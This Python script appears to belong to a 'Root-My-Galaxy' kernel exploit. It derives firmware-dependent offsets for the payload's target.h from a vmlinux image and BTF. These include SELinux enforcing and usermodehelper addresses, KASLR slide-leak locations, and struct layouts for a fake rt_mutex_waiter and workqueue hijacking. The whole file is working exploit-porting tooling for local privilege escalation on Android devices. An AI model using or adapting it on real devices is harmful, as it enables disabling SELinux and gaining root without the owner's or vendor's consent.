#!/usr/bin/env python3
"""Derive every firmware-dependent constant for a Root-My-Galaxy payload
target.h from a recovered vmlinux ELF + raw BTF, following PORTING.md.

Usage: derive_offsets.py <workdir>
  <workdir> contains vmlinux.elf, vmlinux.nm, vmlinux.btf, kernel
"""
import re
import struct
import subprocess
import sys
from pathlib import Path

work = Path(sys.argv[1])
BASE = 0xFFFFFFC080000000  # KIMAGE_TEXT_BASE (arm64 6.6 GKI; verified by vmlinux-to-elf)

# ---------- symbols ----------
syms = {}
order = []
for line in (work / "vmlinux.nm").read_text().splitlines():
    m = re.match(r"^([0-9a-f]{16})\s+\S\s+(\S+)$", line)
    if m:
        addr, name = int(m.group(1), 16), m.group(2)
        if name not in syms:
            syms[name] = addr
            order.append(name)

def off(name):
    if name not in syms:
        raise KeyError(f"missing symbol {name}")
    a = syms[name]
    assert a >= BASE, f"{name} below base: {hex(a)}"
    return a - BASE

image = (work / "kernel").read_bytes()
def read_image(vaddr, n):
    o = vaddr - BASE
    return image[o:o + n]

# ---------- BTF via bpftool raw dump ----------
raw = subprocess.run(["bpftool", "btf", "dump", "file", str(work / "vmlinux.btf"), "format", "raw"],
                     capture_output=True, text=True, check=True).stdout

# Flat parse: every [id] STRUCT/UNION block lists members (incl "(anon)") as
# '\t<name> type_id=N bits_offset=M'. Nested layouts are separate types.
tmap = {}   # id -> {"kind","name","size","members":[(name,type_id,bits_off)]}
cur = None
for line in raw.splitlines():
    m = re.match(r"^\[(\d+)\] (STRUCT|UNION) '([^']*)' size=(\d+)", line)
    if m:
        cur = {"kind": m.group(2), "name": m.group(3), "size": int(m.group(4)), "members": []}
        tmap[int(m.group(1))] = cur
        continue
    if re.match(r"^\[\d+\] ", line):
        cur = None
        continue
    if cur is not None and line.startswith("\t"):
        m = re.match(r"^\t'([^']*)' type_id=(\d+) bits_offset=(\d+)", line)
        if m:
            cur["members"].append((m.group(1), int(m.group(2)), int(m.group(3))))

by_name = {}
for t in tmap.values():
    by_name.setdefault(t["name"], t)

def find_member(tid, name, depth=0):
    """Return bits offset of `name` inside type `tid`, descending anon unions."""
    if depth > 6:
        return None
    t = tmap.get(tid)
    if t is None or t["kind"] not in ("STRUCT", "UNION"):
        return None
    for mname, mtid, bits in t["members"]:
        if mname == name:
            return bits
    for mname, mtid, bits in t["members"]:
        if mname == "(anon)":
            inner = find_member(mtid, name, depth + 1)
            if inner is not None:
                return bits + inner
    return None

def bof(struct, member):
    top = by_name[struct]
    bits = find_member(tmap_id(top), member)
    if bits is None:
        raise KeyError(f"{struct}.{member} missing")
    assert bits % 8 == 0, f"{struct}.{member} not byte-aligned ({bits})"
    return bits // 8

def tmap_id(t):
    for i, v in tmap.items():
        if v is t:
            return i
    raise KeyError

def sz(struct):
    return by_name[struct]["size"]

report = {}
def note(key, val, src):
    report[key] = (val, src)

# ---------- required symbol offsets ----------
sym_names = {
    "CALL_USERMODEHELPER_EXEC_WORK_OFF": "call_usermodehelper_exec_work",
    "NOOP_LLSEEK_OFF": "noop_llseek",
    "COPY_SPLICE_READ_OFF": None,  # copy_splice_read (6.6) or generic_file_splice_read
    "CONFIGFS_READ_ITER_OFF": "configfs_read_iter",
    "CONFIGFS_BIN_WRITE_ITER_OFF": "configfs_bin_write_iter",
    "ASHMEM_IOCTL_OFF": "ashmem_ioctl",
    "ASHMEM_COMPAT_IOCTL_OFF": "compat_ashmem_ioctl",
    "ASHMEM_MMAP_OFF": "ashmem_mmap",
    "ASHMEM_OPEN_OFF": "ashmem_open",
    "ASHMEM_RELEASE_OFF": "ashmem_release",
    "ASHMEM_SHOW_FDINFO_OFF": "ashmem_show_fdinfo",
    "ANON_PIPE_BUF_OPS_OFF": "anon_pipe_buf_ops",
    "ASHMEM_FOPS_OFF": "ashmem_fops",
    "KMALLOC_CACHES_OFF": "kmalloc_caches",
    "SYSTEM_UNBOUND_WQ_OFF": "system_unbound_wq",
    "INIT_TASK_OFF": "init_task",
    "ROOT_TASK_GROUP_OFF": "root_task_group",
    "ASHMEM_MISC_OFF": "ashmem_misc",
}
for key, s in sym_names.items():
    if s is None:
        continue
    note(key, off(s), f"symbol {s}")

for cand in ("copy_splice_read", "generic_file_splice_read"):
    if cand in syms:
        note("COPY_SPLICE_READ_OFF", off(cand), f"symbol {cand}")
        break

# selinux_state.enforcing
note("SELINUX_ENFORCING_OFF", off("selinux_state") + bof("selinux_state", "enforcing"),
     "selinux_state + BTF enforcing")

# miscdevice.fops -> ASHMEM_MISC_FOPS_OFF
note("ASHMEM_MISC_FOPS_OFF", off("ashmem_misc") + bof("miscdevice", "fops"),
     "ashmem_misc + BTF miscdevice.fops")

# ---------- slide / leak ----------
# nfulnl_logger object and its name string target
nl_obj = off("nfulnl_logger")
name_ptr = struct.unpack("<Q", read_image(BASE + nl_obj, 8))[0]
assert BASE <= name_ptr < BASE + len(image)
note("SLIDE_NFULNL_LOGGER_OBJECT_OFF", nl_obj, "symbol nfulnl_logger")
note("SLIDE_NFULNL_LOGGER_NAME_OFF", name_ptr - BASE,
     "first qword of nfulnl_logger -> string")
s = read_image(name_ptr, 32).split(b"\0")[0].decode()
assert s == "nfnetlink_log", f"unexpected logger name {s!r}"

# random_table[] entry named boot_id: ctl_table {procname, data, maxlen, mode, handler,...}
CTL_SZ = sz("ctl_table")
rt = BASE + off("random_table")
boot_id_data_off = None
for i in range(64):
    e = rt + i * CTL_SZ
    procname = struct.unpack("<Q", read_image(e, 8))[0]
    if procname == 0:
        break
    nm = read_image(procname, 24).split(b"\0")[0].decode(errors="replace")
    if nm == "boot_id":
        data_ptr = struct.unpack("<Q", read_image(e + 8, 8))[0]
        boot_id_data_off = e + 8 - BASE
        note("SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF", boot_id_data_off,
             f"random_table[{i}].data slot")
        note("SLIDE_SYSCTL_BOOTID_OFF", data_ptr - BASE,
             f"random_table[{i}].data value")
        break
assert boot_id_data_off, "boot_id ctl entry not found"

# ---------- struct layouts ----------
note("SIZEOF_FILE_OPERATIONS", sz("file_operations"), "BTF")
for k, mname in [("FOPS_OWNER_OFF", "owner"), ("FOPS_LLSEEK_OFF", "llseek"),
                 ("FOPS_READ_OFF", "read"), ("FOPS_WRITE_OFF", "write"),
                 ("FOPS_READ_ITER_OFF", "read_iter"), ("FOPS_WRITE_ITER_OFF", "write_iter"),
                 ("FOPS_UNLOCKED_IOCTL_OFF", "unlocked_ioctl"),
                 ("FOPS_COMPAT_IOCTL_OFF", "compat_ioctl"), ("FOPS_MMAP_OFF", "mmap"),
                 ("FOPS_OPEN_OFF", "open"), ("FOPS_RELEASE_OFF", "release"),
                 ("FOPS_SPLICE_READ_OFF", "splice_read"), ("FOPS_SHOW_FDINFO_OFF", "show_fdinfo")]:
    note(k, bof("file_operations", mname), "BTF file_operations")

for k, m in [("TASK_USAGE_OFF", "usage"), ("TASK_PRIO_OFF", "prio"),
             ("TASK_NORMAL_PRIO_OFF", "normal_prio"),
             ("TASK_SCHED_TASK_GROUP_OFF", "sched_task_group"),
             ("TASK_PI_LOCK_OFF", "pi_lock"), ("TASK_PI_WAITERS_OFF", "pi_waiters"),
             ("TASK_PI_TOP_TASK_OFF", "pi_top_task"), ("TASK_PI_BLOCKED_ON_OFF", "pi_blocked_on")]:
    note(k, bof("task_struct", m), "BTF task_struct")

note("SIZEOF_PAGE", sz("page"), "BTF")
note("PAGE_COMPOUND_HEAD_OFF", bof("page", "compound_head"), "BTF page")
# slab_cache is only named in the type-punned overlay struct slab
note("PAGE_SLAB_CACHE_OFF", bof("slab", "slab_cache"), "BTF slab overlay")
try:
    note("PAGE_PAGE_TYPE_OFF", bof("page", "page_type"), "BTF page")
except KeyError:
    note("PAGE_PAGE_TYPE_OFF", bof("page", "_mapcount"), "BTF page (mapcount alias)")

# rt_mutex_waiter layout used by the fake-writer
for k, m in [("FAKE_WAITER_PI_TREE_OFF", "pi_tree"),
             ("FAKE_WAITER_TASK_OFF", "task"), ("FAKE_WAITER_LOCK_OFF", "lock"),
             ("FAKE_WAITER_WAKE_STATE_OFF", "wake_state"), ("FAKE_WAITER_WW_CTX_OFF", "ww_ctx")]:
    note(k, bof("rt_mutex_waiter", m), "BTF rt_mutex_waiter")
# inner tree field type (contains prio/deadline after rb_root_cached)
wt = by_name["rt_mutex_waiter"]
for mname, mtid, bits in wt["members"]:
    if mname == "tree":
        inner = tmap.get(mtid)
        report["_tree_field_members"] = ({n: b for n, _, b in inner["members"]}, "bits") if inner else ({}, "?")
# rb_node members inside waiter: tree_entry/prio etc. computed via anon unions — emit raw member map
report["_rt_mutex_waiter_members"] = ({n: b for n, _, b in wt["members"]}, "bits")

for k, m in [("WORK_DATA_OFF", "data"), ("WORK_ENTRY_OFF", "entry"), ("WORK_FUNC_OFF", "func")]:
    note(k, bof("work_struct", m), "BTF work_struct")
for k, m in [("PWQ_POOL_OFF", "pool"), ("PWQ_WQ_OFF", "wq"),
             ("PWQ_WORK_COLOR_OFF", "work_color"), ("PWQ_REFCNT_OFF", "refcnt"),
             ("PWQ_NR_IN_FLIGHT_OFF", "nr_in_flight"), ("PWQ_NR_ACTIVE_OFF", "nr_active"),
             ("PWQ_MAX_ACTIVE_OFF", "max_active")]:
    note(k, bof("pool_workqueue", m), "BTF pool_workqueue")
for k, m in [("POOL_WORKLIST_OFF", "worklist"), ("POOL_NR_IDLE_OFF", "nr_idle")]:
    note(k, bof("worker_pool", m), "BTF worker_pool")
note("WQ_DFL_PWQ_OFF", bof("workqueue_struct", "dfl_pwq"), "BTF workqueue_struct")

for k, m in [("CFG_PAGE_OFF", "page"), ("CFG_NEEDS_READ_FILL_OFF", "needs_read_fill"),
             ("CFG_BIN_BUFFER_OFF", "bin_buffer"), ("CFG_BIN_BUFFER_SIZE_OFF", "bin_buffer_size"),
             ("CFG_CB_MAX_SIZE_OFF", "cb_max_size")]:
    note(k, bof("configfs_buffer", m), "BTF configfs_buffer")

note("MM_STRUCT_SZ", sz("mm_struct"), "BTF mm_struct")

# ---------- trace event id ----------
ev = off("__event_sched_blocked_reason")
start = off("__start_ftrace_events")
idx = (ev - start) // 8
note("TRACE_EVENT_INDEX", idx, "(__event_sched_blocked_reason-__start_ftrace_events)/8")
note("SLIDE_TRACEFS_EVENT_ID", 20 + idx, "assume __TRACE_LAST_TYPE=20 (verify vs 6.6 GKI)")

# ---------- output ----------
print(f"kernel image : {len(image)} bytes")
print(f"symbols      : {len(syms)}")
print()
for k in sorted(report):
    v, src = report[k]
    if k.startswith("_"):
        print(f"### {k}: {v} ({src})")
        continue
    print(f"#define {k:<44} 0x{v:x}   # {src}" if isinstance(v, int) and not k.startswith("TRACE")
          else f"# {k} = {v}   # {src}")
